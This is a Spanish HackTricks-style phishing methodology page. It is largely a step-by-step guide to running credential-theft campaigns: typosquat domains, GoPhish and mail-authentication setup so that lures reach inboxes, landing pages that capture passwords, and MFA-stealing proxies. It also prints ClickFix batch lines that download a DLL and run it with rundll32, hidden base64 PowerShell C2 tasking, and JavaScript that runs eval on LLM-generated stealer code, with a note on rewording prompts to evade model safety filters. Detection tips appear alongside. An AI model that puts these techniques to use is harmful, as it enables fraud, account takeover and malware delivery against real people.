# Phishing Metodología

{{#include ../../banners/hacktricks-training.md}}

## Metodología

1. Recon de la víctima
1. Selecciona el **dominio víctima**.
2. Realiza una enumeración web básica **buscando login portals** usados por la víctima y **decide** cuál vas a **impersonate**.
3. Usa algo de **OSINT** para **encontrar correos electrónicos**.
2. Prepara el entorno
1. **Buy the domain** que vas a usar para la evaluación de phishing
2. **Configura los registros** relacionados con el servicio de email (SPF, DMARC, DKIM, rDNS)
3. Configura el VPS con **gophish**
3. Prepara la campaña
1. Prepara la **plantilla de email**
2. Prepara la **página web** para robar las credenciales
4. ¡Lanza la campaña!

## Generar nombres de dominio similares o comprar un dominio confiable

### Técnicas de variación de nombres de dominio

- **Keyword**: El nombre de dominio **contiene** una **keyword** importante del dominio original (p.ej., zelster.com-management.com).
- **hypened subdomain**: Cambia el **punto por un guion** en un subdominio (p.ej., www-zelster.com).
- **New TLD**: Mismo dominio usando un **nuevo TLD** (p.ej., zelster.org)
- **Homoglyph**: Sustituye una letra en el nombre de dominio por **letras que se parecen** (p.ej., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Intercambia dos letras dentro del nombre de dominio (p.ej., zelsetr.com).
- **Singularization/Pluralization**: Añade o quita una “s” al final del nombre de dominio (p.ej., zeltsers.com).
- **Omission**: Elimina una de las letras del nombre de dominio (p.ej., zelser.com).
- **Repetition:** Repite una de las letras en el nombre de dominio (p.ej., zeltsser.com).
- **Replacement**: Similar a homoglyph pero menos sigiloso. Sustituye una de las letras en el nombre de dominio, quizás por una letra cercana en el teclado (p.ej., zektser.com).
- **Subdomained**: Introduce un **punto** dentro del nombre de dominio (p.ej., ze.lster.com).
- **Insertion**: Inserta una letra en el nombre de dominio (p.ej., zerltser.com).
- **Missing dot**: Añade la TLD al final del nombre de dominio. (p.ej., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Existe la **posibilidad de que uno o varios bits almacenados o en comunicación se inviertan automáticamente** debido a factores como eyecciones solares, rayos cósmicos o errores de hardware.

Cuando este concepto se **aplica a las peticiones DNS**, es posible que el **dominio recibido por el servidor DNS** no sea el mismo que el dominio solicitado inicialmente.

Por ejemplo, una modificación de un solo bit en el dominio "windows.com" puede convertirlo en "windnws.com."

Los atacantes pueden **aprovechar esto registrando múltiples dominios bit-flipping** que sean similares al dominio de la víctima. Su intención es redirigir a usuarios legítimos a su propia infraestructura.

Para más información lee [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Comprar un dominio confiable

Puedes buscar en [https://www.expireddomains.net/](https://www.expireddomains.net) un dominio expirado que puedas usar.\
Para asegurarte de que el dominio expirado que vas a comprar **ya tiene buen SEO** puedes comprobar cómo está categorizado en:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Descubrimiento de correos electrónicos

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Para **descubrir más** direcciones de correo válidas o **verificar las que** ya has descubierto puedes comprobar si puedes brute-force los servidores SMTP de la víctima. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Además, no olvides que si los usuarios usan **algún portal web para acceder a sus mails**, puedes comprobar si es vulnerable a **username brute force**, y explotar la vulnerabilidad si es posible.

## Configuración de GoPhish

### Instalación

Puedes descargarlo desde [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Descárgalo y descomprímelo dentro de `/opt/gophish` y ejecuta `/opt/gophish/gophish`\
Se mostrará una contraseña para el usuario admin en el puerto 3333 en la salida. Por lo tanto, accede a ese puerto y usa esas credenciales para cambiar la contraseña del admin. Puede que necesites tunelar ese puerto a local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuración

**Configuración del certificado TLS**

Antes de este paso deberías haber **ya comprado el dominio** que vas a usar y este debe estar **apuntando** a la **IP del VPS** donde estés configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuración de correo**

Comienza instalando: `apt-get install postfix`

Luego añade el dominio a los siguientes archivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**También cambia los valores de las siguientes variables dentro de /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finalmente modifica los archivos **`/etc/hostname`** y **`/etc/mailname`** con el nombre de tu dominio y **reinicia tu VPS.**

Ahora crea un **DNS A record** de `mail.<domain>` apuntando a la **ip address** del VPS y un **DNS MX** record apuntando a `mail.<domain>`

Ahora vamos a probar a enviar un correo:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuración de Gophish**

Detén la ejecución de gophish y vamos a configurarlo.\
Modifica `/opt/gophish/config.json` con lo siguiente (nota el uso de https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurar el servicio gophish**

Para crear el servicio gophish de modo que pueda iniciarse automáticamente y gestionarse como un servicio, puede crear el archivo `/etc/init.d/gophish` con el siguiente contenido:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Termina de configurar el servicio y comprueba su funcionamiento realizando:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configuración del servidor de correo y dominio

### Espera & sé legítimo

Cuanto más antiguo sea un dominio, menos probable será que se marque como spam. Por tanto, debes esperar todo el tiempo posible (al menos 1 semana) antes de la evaluación de phishing. Además, si publicas una página sobre un sector con buena reputación, la reputación obtenida será mejor.

Ten en cuenta que, aunque tengas que esperar una semana, puedes terminar de configurar todo ahora.

### Configurar Reverse DNS (rDNS) record

Configura un rDNS (PTR) record que resuelva la dirección IP del VPS al nombre de dominio.

### Registro Sender Policy Framework (SPF)

Debes **configurar un registro SPF para el nuevo dominio**. Si no sabes qué es un registro SPF [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puedes usar [https://www.spfwizard.net/](https://www.spfwizard.net) para generar tu política SPF (usa la IP de la máquina VPS)

![](<../../images/image (1037).png>)

Este es el contenido que debe establecerse dentro de un TXT record en el dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Debes **configurar un registro DMARC para el nuevo dominio**. Si no sabes qué es un registro DMARC [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Tienes que crear un nuevo registro DNS TXT apuntando al hostname `_dmarc.<domain>` con el siguiente contenido:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Debes **configurar un DKIM para el nuevo dominio**. Si no sabes qué es un registro DMARC [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> You need to concatenate both B64 values that the DKIM key generates:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Prueba la puntuación de tu configuración de correo

You can do that using [https://www.mail-tester.com/](https://www.mail-tester.com/)\ Solo accede a la página y envía un email a la dirección que te proporcionen:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
También puedes **comprobar la configuración de tu correo electrónico** enviando un correo a `check-auth@verifier.port25.com` y **leer la respuesta** (para esto necesitarás **abrir** el puerto **25** y ver la respuesta en el archivo _/var/mail/root_ si envías el correo como root).\
Comprueba que superas todas las pruebas:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
También podrías enviar **un mensaje a un Gmail bajo tu control**, y revisar las **cabeceras del correo** en tu bandeja de entrada de Gmail, `dkim=pass` debería aparecer en el campo de cabecera `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Eliminación de la lista negra de Spamhouse

La página [www.mail-tester.com](https://www.mail-tester.com) puede indicar si tu dominio está siendo bloqueado por spamhouse. Puedes solicitar que tu dominio/IP sea eliminado en: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Eliminar de la lista negra de Microsoft

​​Puedes solicitar la eliminación de tu dominio/IP en [https://sender.office.com/](https://sender.office.com).

## Crear y lanzar la campaña GoPhish

### Perfil de envío

- Establece un **nombre para identificar** el perfil del remitente
- Decide desde qué cuenta vas a enviar los correos de phishing. Sugerencias: _noreply, support, servicedesk, salesforce..._
- Puedes dejar en blanco el nombre de usuario y la contraseña, pero asegúrate de marcar Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Se recomienda usar la funcionalidad "**Send Test Email**" para comprobar que todo funciona.\
> Recomiendo **enviar los test emails a direcciones de 10min mail** para evitar ser incluido en listas negras al hacer pruebas.

### Plantilla de correo

- Establece un **nombre para identificar** la plantilla
- Luego escribe un **asunto** (nada extraño, algo que podrías esperar leer en un correo normal)
- Asegúrate de haber marcado "**Add Tracking Image**"
- Escribe la **plantilla de email** (puedes usar variables como en el siguiente ejemplo):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Ten en cuenta que **para aumentar la credibilidad del correo electrónico**, se recomienda usar alguna firma extraída de un correo del cliente. Sugerencias:

- Envía un correo a una **dirección inexistente** y comprueba si la respuesta contiene alguna firma.
- Busca **correos públicos** como info@ex.com o press@ex.com o public@ex.com, envíales un correo y espera la respuesta.
- Intenta contactar **algún correo válido descubierto** y espera la respuesta

![](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Escribe un **nombre**
- **Escribe el código HTML** de la página web. Ten en cuenta que puedes **importar** páginas web.
- Marca **Capture Submitted Data** y **Capture Passwords**
- Configura una **redirección**

![](<../../images/image (826).png>)

> [!TIP]
> Normalmente tendrás que modificar el código HTML de la página y hacer algunas pruebas en local (quizá usando algún servidor Apache) **hasta que te gusten los resultados.** Luego, pega ese código HTML en el cuadro.\
> Ten en cuenta que si necesitas **usar recursos estáticos** para el HTML (por ejemplo CSS o JS) puedes guardarlos en _**/opt/gophish/static/endpoint**_ y luego acceder a ellos desde _**/static/\<filename>**_

> [!TIP]
> Para la redirección podrías **redirigir a los usuarios a la página web principal legítima** de la víctima, o redirigirlos a _/static/migration.html_ por ejemplo, mostrar una **rueda de carga (**[**https://loading.io/**](https://loading.io)**) durante 5 segundos y luego indicar que el proceso fue satisfactorio**.

### Users & Groups

- Pon un nombre
- **Importa los datos** (ten en cuenta que para usar la plantilla del ejemplo necesitas los campos firstname, last name y email address de cada usuario)

![](<../../images/image (163).png>)

### Campaign

Finalmente, crea una campaña seleccionando un nombre, la email template, la landing page, la URL, el sending profile y el grupo. Ten en cuenta que la URL será el enlace enviado a las víctimas.

Fíjate que el **Sending Profile permite enviar un correo de prueba para ver cómo quedará el correo de phishing final**:

![](<../../images/image (192).png>)

> [!TIP]
> Recomendaría **enviar los correos de prueba a direcciones de 10min mails** para evitar ser incluido en listas negras al hacer pruebas.

¡Una vez que todo esté listo, simplemente lanza la campaña!

## Website Cloning

Si por alguna razón quieres clonar el sitio web consulta la siguiente página:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

En algunas evaluaciones de phishing (principalmente para Red Teams) también querrás **enviar archivos que contengan algún tipo de backdoor** (quizá un C2 o quizá algo que simplemente desencadene una autenticación).\
Consulta la siguiente página para algunos ejemplos:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

El ataque anterior es bastante ingenioso porque estás suplantando una web real y recogiendo la información introducida por el usuario. Desafortunadamente, si el usuario no introdujo la contraseña correcta o si la aplicación que suplantaste está configurada con 2FA, **esa información no te permitirá suplantar al usuario engañado**.

Aquí es donde herramientas como [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) y [**muraena**](https://github.com/muraenateam/muraena) son útiles. Esta clase de herramientas te permite generar un ataque MitM. Básicamente, el ataque funciona de la siguiente manera:

1. Suplantas el formulario de login de la página real.
2. El usuario **envía** sus **credenciales** a tu página falsa y la herramienta las reenvía a la página real, **comprobando si las credenciales funcionan**.
3. Si la cuenta está configurada con **2FA**, la página MitM pedirá el código y, una vez que el **usuario lo introduce**, la herramienta lo enviará a la página real.
4. Una vez que el usuario está autenticado tú (como atacante) habrás **capturado las credenciales, el 2FA, la cookie y cualquier información** de cada interacción mientras la herramienta está realizando el MitM.

### Via VNC

¿Qué pasa si, en lugar de **enviar a la víctima a una página maliciosa** con el mismo aspecto que la original, la envías a una **sesión VNC con un navegador conectado a la página real**? Podrás ver lo que hace, robar la contraseña, el MFA usado, las cookies...\
Puedes hacer esto con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Obviamente una de las mejores maneras de saber si te han descubierto es **buscar tu dominio en listas negras**. Si aparece listado, de alguna manera tu dominio fue detectado como sospechoso.\
Una forma sencilla de comprobar si tu dominio aparece en alguna blacklist es usar [https://malwareworld.com/](https://malwareworld.com)

Sin embargo, hay otras formas de saber si la víctima está **buscando activamente actividad de phishing sospechosa** en la red, como se explica en:


{{#ref}}
detecting-phising.md
{{#endref}}

Puedes **comprar un dominio con un nombre muy similar** al dominio de la víctima **y/o generar un certificado** para un **subdominio** de un dominio que controlas **conteniendo** la **palabra clave** del dominio de la víctima. Si la **víctima** realiza cualquier tipo de interacción DNS o HTTP con ellos, sabrás que **está buscando activamente** dominios sospechosos y tendrás que ser muy sigiloso.

### Evaluate the phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious) para evaluar si tu correo acabará en la carpeta de spam, será bloqueado o será exitoso.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Las intrusiones modernas cada vez omiten más los señuelos por correo y **apuntan directamente al workflow de service-desk / identity-recovery** para derrotar MFA. El ataque es totalmente "living-off-the-land": una vez que el operador tiene credenciales válidas pivota con herramientas administrativas integradas – no se requiere malware.

### Attack flow
1. Recon de la víctima
* Recopila detalles personales y corporativos de LinkedIn, filtraciones de datos, GitHub público, etc.
* Identifica identidades de alto valor (ejecutivos, IT, finanzas) y enumera el **proceso exacto del help-desk** para el reseteo de contraseña / MFA.
2. Ingeniería social en tiempo real
* Llama por teléfono, Teams o chat al help-desk suplantando al objetivo (a menudo con **spoofed caller-ID** o **voz clonada**).
* Proporciona la PII recolectada para pasar la verificación basada en conocimiento.
* Convence al agente de **resetear el secreto MFA** o realizar un **SIM-swap** en un número móvil registrado.
3. Acciones inmediatamente tras el acceso (≤60 min en casos reales)
* Establece un foothold a través de cualquier portal web SSO.
* Enumera AD / AzureAD con herramientas integradas (sin desplegar binarios):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Movimiento lateral con **WMI**, **PsExec**, o agentes legítimos **RMM** ya permitidos en el entorno.

### Detection & Mitigation
* Trata la recuperación de identidad por help-desk como una **operación privilegiada** – requiere autenticación step-up y aprobación del manager.
* Despliega reglas de **Identity Threat Detection & Response (ITDR)** / **UEBA** que alerten sobre:
* Método MFA cambiado + autenticación desde un dispositivo / geo nuevo.
* Elevación inmediata del mismo principal (user → admin).
* Graba las llamadas al help-desk y exige un **call-back a un número ya registrado** antes de cualquier reset.
* Implementa **Just-In-Time (JIT) / Privileged Access** para que las cuentas recién reseteadas **no** hereden automáticamente tokens de alto privilegio.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Grupos de commodity compensan el coste de operaciones de alto contacto con ataques masivos que convierten **motores de búsqueda y redes de anuncios en el canal de entrega**.

1. **SEO poisoning / malvertising** impulsa un resultado falso como `chromium-update[.]site` a los anuncios principales de búsqueda.
2. La víctima descarga un pequeño **first-stage loader** (a menudo JS/HTA/ISO). Ejemplos observados por Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. El loader exfiltra cookies del navegador + bases de datos de credenciales, luego descarga un **silent loader** que decide – *en tiempo real* – si desplegar:
* RAT (p. ej. AsyncRAT, RustDesk)
* ransomware / wiper
* componente de persistencia (clave Run del registro + tarea programada)

### Hardening tips
* Bloquea dominios recién registrados y aplica **Advanced DNS / URL Filtering** en *search-ads* así como en e-mail.
* Restringe la instalación de software a paquetes MSI firmados / Store, deniega la ejecución de `HTA`, `ISO`, `VBS` por política.
* Monitoriza procesos hijos de navegadores que lancen instaladores:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Busca entre los LOLBins frecuentemente abusados por first-stage loaders (por ejemplo `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: advisory clonado de un CERT nacional con un botón **Update** que muestra instrucciones paso a paso para el “fix”. A las víctimas se les indica ejecutar un batch que descarga una DLL y la ejecuta con `rundll32`.
* Cadena típica de batch observada:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` deja el payload en `%TEMP%`, una breve espera oculta la fluctuación de red, luego `rundll32` llama al entrypoint exportado (`notepad`).
* La DLL beaconiza la identidad del host y consulta C2 cada pocos minutos. Las tareas remotas llegan como **PowerShell codificado en base64** ejecutado de forma oculta y con bypass de políticas:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Esto preserva la flexibilidad del C2 (el servidor puede cambiar tareas sin actualizar la DLL) y oculta las ventanas de consola. Busca procesos PowerShell hijos de `rundll32.exe` usando `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` conjuntamente.
* Los defensores pueden buscar callbacks HTTP(S) del tipo `...page.php?tynor=<COMPUTER>sss<USER>` y intervalos de sondeo de 5 minutos tras la carga de la DLL.

---

## AI-Enhanced Phishing Operations
Los atacantes ahora encadenan **APIs de LLM y clonación de voz** para señuelos totalmente personalizados e interacción en tiempo real.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generar y enviar >100 k emails / SMS con redacción aleatoria y enlaces de seguimiento.|
|Generative AI|Producir correos *únicos* que hagan referencia a M&A públicas, bromas internas de redes sociales; voz deep-fake del CEO en una estafa de callback.|
|Agentic AI|Registrar dominios de forma autónoma, raspar inteligencia open-source, redactar correos de siguiente etapa cuando una víctima hace click pero no envía credenciales.|

**Defensa:**
• Añadir **banners dinámicos** destacando mensajes enviados por automatización no confiable (basado en anomalías ARC/DKIM).  
• Desplegar **frases de desafío biométricas por voz** para solicitudes telefónicas de alto riesgo.  
• Simular continuamente señuelos generados por IA en los programas de concienciación – las plantillas estáticas están obsoletas.

Véase también – abuso de agentic browsing para phishing de credenciales:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Véase también – abuso de agentes AI en herramientas CLI locales y MCP (para inventario de secrets y detección):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Los atacantes pueden servir HTML aparentemente benigno y **generar el stealer en tiempo de ejecución** pidiendo a una **API LLM de confianza** JavaScript, y luego ejecutarlo en el navegador (p. ej., `eval` o `<script>` dinámico).

1. **Prompt-as-obfuscation:** codificar URLs de exfil / cadenas Base64 en el prompt; iterar el texto para evadir filtros de seguridad y reducir alucinaciones.
2. **Client-side API call:** al cargar, el JS llama a un LLM público (Gemini/DeepSeek/etc.) o a un proxy CDN; solo el prompt/llamada API está presente en el HTML estático.
3. **Assemble & exec:** concatenar la respuesta y ejecutarla (polimórfico por visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** el código generado personaliza el señuelo (p. ej., LogoKit token parsing) y envía creds al endpoint oculto en el prompt.

**Características de evasión**
- El tráfico alcanza dominios LLM bien conocidos o proxies CDN reputables; a veces vía WebSockets a un backend.
- No hay payload estático; el JS malicioso existe solo después del render.
- Las generaciones no deterministas producen stealers **únicos** por sesión.

**Ideas de detección**
- Ejecutar sandboxes con JS habilitado; alertar sobre **`eval` en tiempo de ejecución/creación dinámica de scripts provenientes de respuestas LLM**.
- Buscar POSTs front-end a LLM APIs inmediatamente seguidos por `eval`/`Function` en el texto retornado.
- Alertar sobre dominios LLM no autorizados en el tráfico cliente junto con POSTs de credenciales posteriores.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Además del clásico push-bombing, los operadores simplemente **forzar un nuevo registro de MFA** durante la llamada al help-desk, anulando el token existente del usuario. Cualquier solicitud de inicio de sesión posterior parece legítima para la víctima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitorea eventos de AzureAD/AWS/Okta donde **`deleteMFA` + `addMFA`** ocurren **en cuestión de minutos desde la misma IP**.



## Clipboard Hijacking / Pastejacking

Los atacantes pueden copiar silenciosamente comandos maliciosos en el portapapeles de la víctima desde una página web comprometida o typosquatted y luego engañar al usuario para que los pegue dentro de **Win + R**, **Win + X** o una ventana de terminal, ejecutando código arbitrario sin ninguna descarga o adjunto.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* El APK incrusta credenciales estáticas y por-perfil “unlock codes” (sin autenticación en servidor). Las víctimas siguen un flujo falso de exclusividad (login → locked profiles → unlock) y, con los códigos correctos, son redirigidas a chats de WhatsApp con números `+92` controlados por el atacante mientras el spyware funciona en silencio.
* La recolección comienza incluso antes del login: exfiltración inmediata del **ID del dispositivo**, contactos (como `.txt` desde la caché) y documentos (images/PDF/Office/OpenXML). Un observador de contenido (content observer) sube automáticamente nuevas fotos; una tarea programada vuelve a escanear documentos nuevos cada **5 minutos**.
* Persistencia: se registra para `BOOT_COMPLETED` y mantiene un **foreground service** activo para sobrevivir reinicios y expulsiones del background.

### WhatsApp device-linking hijack via QR social engineering
* Una página de cebo (p. ej., un “channel” falso de un ministerio/CERT) muestra un QR de WhatsApp Web/Desktop e instruye a la víctima a escanearlo, añadiendo en silencio al atacante como **linked device**.
* El atacante obtiene inmediatamente visibilidad de chats/contactos hasta que la sesión se elimina. Las víctimas pueden ver más tarde una notificación “new device linked”; los defensores pueden buscar device-link events inesperados poco después de visitas a páginas QR no confiables.

### Mobile‑gated phishing to evade crawlers/sandboxes
Los operadores cada vez más restringen sus flujos de phishing detrás de una comprobación simple del dispositivo para que los crawlers de escritorio nunca alcancen las páginas finales. Un patrón común es un pequeño script que prueba si el DOM tiene capacidad táctil y envía el resultado a un endpoint del servidor; los clientes no móviles reciben HTTP 500 (o una página en blanco), mientras que a los usuarios móviles se les sirve el flujo completo.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` lógica (simplificada):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamiento del servidor observado con frecuencia:
- Establece una session cookie durante la primera carga.
- Acepta `POST /detect {"is_mobile":true|false}`.
- Devuelve 500 (o un placeholder) a GETs posteriores cuando `is_mobile=false`; sirve phishing solo si `true`.

Heurísticas de búsqueda y detección:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Telemetría web: secuencia de `GET /static/detect_device.js` → `POST /detect` → HTTP 500 para no‑móviles; rutas legítimas de víctimas móviles devuelven 200 con HTML/JS posterior.
- Bloquear o examinar páginas que condicionen el contenido exclusivamente en `ontouchstart` u otras comprobaciones de dispositivo similares.

Consejos de defensa:
- Ejecutar crawlers con fingerprints tipo móvil y JS habilitado para revelar contenido restringido.
- Generar alertas sobre respuestas 500 sospechosas tras `POST /detect` en dominios recién registrados.

## Referencias

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
